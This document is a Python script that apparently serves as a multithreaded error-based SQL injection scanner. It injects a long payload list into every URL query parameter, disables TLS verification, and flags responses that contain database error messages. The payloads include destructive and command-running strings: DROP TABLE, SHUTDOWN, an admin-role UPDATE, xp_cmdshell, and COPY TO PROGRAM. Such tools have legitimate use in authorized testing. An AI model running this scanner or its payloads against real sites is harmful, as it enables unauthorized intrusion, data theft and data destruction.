import requests
import threading
import argparse
from urllib.parse import urlparse, parse_qs, urlencode
from colorama import Fore, Style, init
from math import ceil
import sys

# Initialize colorama for colored output
init(autoreset=True)

# Suppress only the single InsecureRequestWarning from urllib3 needed.
from urllib3.exceptions import InsecureRequestWarning
import urllib3
urllib3.disable_warnings(InsecureRequestWarning)

# Enhanced SQLi payloads designed to trigger SQL errors
payloads = [
    "'", '"', "`", "\\", ")", "('", ")'", "'))", '"', '")', '"("', "' OR '1'='1",
    "' OR 1=1--", "' OR '1'='1' --", "' OR '1'='1' ({", "' OR '1'='1' /*",
    "' OR '1'='1' /*", "' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
    "' OR 1=1#", "' OR 1=1/*", "' OR 'a'='a", "' OR '1'='1' -- -",
    "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 LIMIT 1--",
    "' OR EXISTS(SELECT 1)--", "' AND 1=0 UNION ALL SELECT NULL--",
    "' UNION SELECT ALL FROM information_schema.tables--",
    "' UNION SELECT username, password FROM users--",
    "' OR UPDATE users SET role = 'admin' WHERE username = 'admin'--",
    "' AND ASCII(SUBSTRING((SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES),1,1)) > 80 --",
    "' OR OPENROWSET('SQL Server', 'Server=localhost;UID=sa;PWD=;', 'SELECT name FROM sys.databases')--",
    "' OR (SELECT COUNT(*) FROM users) > 0--",
    "' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
    "' OR 1=1; EXEC xp_cmdshell('dir'); --",
    "'; EXECUTE IMMEDIATE 'DROP TABLE users'; --",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' OR 1=1-- -",
    "' OR 1=1#",
    "' OR '1'='1'#",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR '1'='1' or ''='",
    "' OR 1=1 OR ''='",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "' OR '1'='1' AND '1'='1",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' AND EXISTS(SELECT * FROM users WHERE username = 'admin') --",
    "' AND SLEEP(5)--",
    "' WAITFOR DELAY '0:0:5'--",
    "'; SHUTDOWN; --",
    "'; DROP TABLE users; --",
    "'; SELECT pg_sleep(5); --",
    "'; SELECT pg_cancel_backend(pg_backend_pid()); --",
    "'; COPY (SELECT '') TO PROGRAM 'cmd.exe /c calc.exe'; --",
    "'; EXEC xp_cmdshell('ping 127.0.0.1'); --",
    "'; DECLARE @q NVARCHAR(4000); SET @q='calc.exe'; EXEC(@q); --"
]

# Comprehensive SQL error messages list for various databases
error_messages = [
    # General SQL Errors
    "SQL syntax", "syntax error", "Warning: mysql", "Warning: mysqli",
    "You have an error in your SQL syntax", "supplied argument is not a valid MySQL result resource",
    "Unclosed quotation mark after the character string", "quoted string not properly terminated",
    "General error", "SQLSTATE", "Microsoft OLE DB Provider for SQL Server",
    "Incorrect syntax near", "SQL query failed", "Unknown column", "WHERE clause", "Invalid query",
    "DB Error", "Syntax error in string in query expression", "Division by zero", "ORA-",
    "missing right parenthesis", "Invalid use of NULL", "ODBC SQL", "SQL Server", "MySQL Error",
    "MariaDB server version for the right syntax to use", "PG::SyntaxError", "psql:", "fatal error",
    "ORA-00933", "ORA-01756", "Warning: pg_", "unterminated quoted string at or near", "ERROR:",

    # MySQL Error Messages
    "Warning: mysql_fetch_array()", "Warning: mysql_num_rows()", "Warning: mysql_pconnect()",
    "Warning: mysql_result()", "MySQL server version for the right syntax to use near",
    "MySQL Error:", "Warning: mysqli_query()", "Warning: mysqli_fetch_array()",
    "Unknown column in 'field list'", "MySQL server has gone away",
    "Column count doesn't match value count at row", "Duplicate entry for key",
    "Can't find file", "Out of range value for column", "Error executing query",
    "Access denied for user", "No database selected", "Not a valid MySQL result resource",
    "You have an error in your SQL syntax; check the manual",

    # MSSQL Error Messages
    "Unclosed quotation mark after the character string", "Incorrect syntax near",
    "Syntax error converting the varchar value to a column of data type int",
    "Microsoft OLE DB Provider for SQL Server", "Must declare scalar variable",
    "Conversion failed when converting the varchar value", "The multi-part identifier could not be bound",
    "Invalid object name", "Login failed for user", "Warning: mssql_query()",
    "Warning: mssql_connect()", "Warning: mssql_fetch_array()", "Invalid cursor state",
    "Error converting data type varchar to numeric", "Cannot insert duplicate key",
    "Violation of PRIMARY KEY constraint", "Invalid column name", "Procedure expects parameter",
    "Cannot insert explicit value for identity column", "General SQL Server error",

    # PostgreSQL Error Messages
    "PostgreSQL query failed: ERROR: syntax error", "pg_query(): Query failed",
    "Warning: pg_exec()", "Warning: pg_query()", "Warning: pg_num_rows()",
    "Warning: pg_fetch_array()", "unterminated quoted string at or near",
    "invalid input syntax for integer", "ERROR: column does not exist",
    "ERROR: syntax error at or near", "ERROR: relation", "ERROR: division by zero",
    "ERROR: invalid byte sequence for encoding", "ERROR: permission denied for relation",
    "ERROR: invalid input value for enum", "ERROR: invalid regular expression",
    "ERROR: function does not exist", "ERROR: operator does not exist",
    "Cannot insert a duplicate key value", "ERROR: cannot insert into a column referenced in a foreign key",

    # Oracle Error Messages
    "ORA-00933: SQL command not properly ended", "ORA-00921: unexpected end of SQL command",
    "ORA-00942: table or view does not exist", "ORA-01756: quoted string not properly terminated",
    "ORA-00904: invalid identifier", "ORA-01400: cannot insert NULL into",
    "ORA-01401: inserted value too large for column", "ORA-01722: invalid number",
    "ORA-06550: line", "PLS-00103: Encountered the symbol", "ORA-00936: missing expression",
    "ORA-00907: missing right parenthesis", "ORA-00001: unique constraint violated",
    "ORA-01830: date format picture ends before converting entire input string",
    "ORA-00917: missing comma", "ORA-01438: value larger than specified precision",
    "ORA-00932: inconsistent datatypes", "ORA-00984: column not allowed here",
    "ORA-00979: not a GROUP BY expression", "ORA-02291: integrity constraint violation",
    "ORA-06512: at line", "ORA-04091: table is mutating, trigger/function may not see it",
    "ORA-01031: insufficient privileges", "ORA-01555: snapshot too old",

    # SQLite Error Messages
    "SQLite error: near", "SQL logic error or missing database", "no such table",
    "SQLite3::query(): Unable to prepare statement", "SQLite3::exec(): not an error",
    "unable to open database file", "no such column", "datatype mismatch",
    "column index out of range", "unrecognized token", "constraint failed",
    "syntax error near unexpected token", "file is encrypted or is not a database",

    # MariaDB Error Messages
    "ERROR 1064 (42000): You have an error in your SQL syntax", "Warning: mariadb_query()",
    "Column count doesn't match value count", "MySQL server has gone away",
    "Access denied for user", "Can't find file",

    # General Error Messages
    "Warning: odbc_exec()", "Database error", "Query failed", "ODBC SQL Server Driver",
    "Invalid query", "Error executing query", "Fatal error:", "ORA-06502: PL/SQL: numeric or value error",
    "ODBC error", "Syntax error", "Server error in '/' application", "Query error",
    "SQL syntax error", "Query execution error", "DB query failed", "Database connection failed",
    "Invalid database name", "Incorrect syntax near 'keyword'", "Invalid parameter value",
    "Access violation", "Unclosed quotation mark", "Command not found",
    "Invalid SQL statement"
]

# Function to test SQL injection for a single URL parameter
def test_sqli(url, param, original_value, verbose):
    for payload in payloads:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        # Preserve other parameters and inject payload into the target parameter
        params[param] = original_value + payload
        new_query = urlencode(params, doseq=True)
        test_url = parsed_url._replace(query=new_query).geturl()

        # If verbose mode is enabled, show the current payload being tested
        if verbose:
            print(f"Testing: {test_url} with payload: {payload}")

        try:
            response = requests.get(test_url, timeout=5, verify=False)
            for error in error_messages:
                if error.lower() in response.text.lower():
                    return (test_url, payload, error)
        except requests.RequestException as e:
            if verbose:
                print(f"Request failed: {e}")
            continue
    return None

# Worker function for threading
def worker(urls, output_file, lock, results_counter, total_urls, verbose):
    for url in urls:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        if not params:
            continue  # Skip URLs without parameters

        found = False

        for param, values in params.items():
            original_value = values[0]
            result = test_sqli(url, param, original_value, verbose)

            with lock:
                results_counter[0] += 1

                # Print URL header in a box-like format
                print(f"┌{'─'*80}┐")
                header = f" Testing URL {results_counter[0]} / {total_urls} "
                print(f"│{header.center(80)}│")
                print(f"└{'─'*80}┘")

                if result:
                    print(Fore.GREEN + f"   URL: {result[0]}")
                    print(Fore.GREEN + f"   Parameter: {param}")
                    print(Fore.GREEN + f"   Payload: {result[1]}")
                    print(Fore.GREEN + f"   Status: Vulnerable [✔️]")
                    print(Fore.GREEN + f"   Error Detected: {result[2]}")
                    with open(output_file, 'a') as f:
                        f.write(f"Potential SQLi detected:\n")
                        f.write(f"URL: {result[0]}\n")
                        f.write(f"Parameter: {param}\n")
                        f.write(f"Payload: {result[1]}\n")
                        f.write(f"Error: {result[2]}\n")
                        f.write("-" * 80 + "\n")
                    found = True
                else:
                    if verbose:
                        print(Fore.RED + f"   URL: {url}")
                        print(Fore.RED + f"   Parameter: {param}")
                        print(Fore.RED + "   Status: Not vulnerable [❌]")

# Main function
def main(input_file, output_file, thread_count, verbose):
    try:
        with open(input_file, 'r') as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"Input file '{input_file}' not found.")
        sys.exit(1)

    if not urls:
        print(Fore.YELLOW + "No URLs to process.")
        sys.exit(0)

    # Overwrite the output file at the start
    with open(output_file, 'w') as f:
        f.write("")

    total_urls = len(urls)
    results_counter = [0]  # Shared counter between threads
    lock = threading.Lock()

    # Adjust chunking logic for dividing URLs among threads
    chunk_size = ceil(total_urls / thread_count)
    threads = []

    for i in range(thread_count):
        start = i * chunk_size
        end = min(start + chunk_size, total_urls)
        thread = threading.Thread(target=worker, args=(urls[start:end], output_file, lock, results_counter, total_urls, verbose))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(Fore.CYAN + f"\nScanning completed. Results saved to '{output_file}'.")

# Command-line argument parsing
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Error-based Detection Script")
    parser.add_argument("-i", "--input", required=True, help="Input file with URLs")
    parser.add_argument("-o", "--output", required=True, help="Output file for results")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads (default: 1)")
    parser.add_argument("-v", "--verbose", action='store_true', help="Enable verbose mode to print all URLs being tested with payloads")

    args = parser.parse_args()
    main(args.input, args.output, args.threads, args.verbose)
